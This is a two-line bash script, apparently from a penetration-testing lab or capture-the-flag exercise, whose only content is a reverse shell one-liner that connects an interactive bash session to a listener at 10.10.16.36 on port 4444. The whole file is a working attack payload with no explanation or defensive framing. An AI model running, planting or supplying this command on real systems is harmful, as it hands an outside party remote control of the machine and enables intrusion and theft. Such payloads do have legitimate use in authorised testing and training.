#!/bin/bash

bash -i >& /dev/tcp/10.10.16.36/4444 0>&1
